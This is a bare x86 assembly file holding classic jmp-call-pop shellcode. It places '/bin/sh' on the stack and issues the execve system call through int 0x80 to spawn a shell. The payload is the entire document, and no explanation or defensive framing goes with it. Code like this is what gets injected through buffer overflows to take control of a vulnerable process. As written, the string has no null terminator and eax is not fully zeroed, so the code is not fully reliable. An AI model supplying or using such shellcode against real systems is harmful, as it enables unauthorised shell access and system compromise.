section .text:
    global _start

_start:
    jmp short two

one:
    pop ebx

    xor ecx, ecx
    xor edx, edx

    mov al, 11
    int 128

two:
    call one
    db "/bin/sh"
